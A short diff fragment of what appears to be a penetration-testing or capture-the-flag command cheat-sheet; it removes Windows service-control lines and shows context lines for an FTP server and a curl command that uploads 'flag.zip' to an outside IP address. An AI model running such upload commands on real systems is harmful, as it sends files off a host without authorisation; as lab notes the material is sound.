@@ -83,12 +83,7 @@ curl 192.77.184.2 --upload-file flag.zip
 # FTP
 python -m pyftpdlib 21
 ftp 10.10.10.10
-# stop service
-sc stop SERVICE
 
-sc query SERVICE to check service
-
-sc start SERVICE to start 
 
 
 
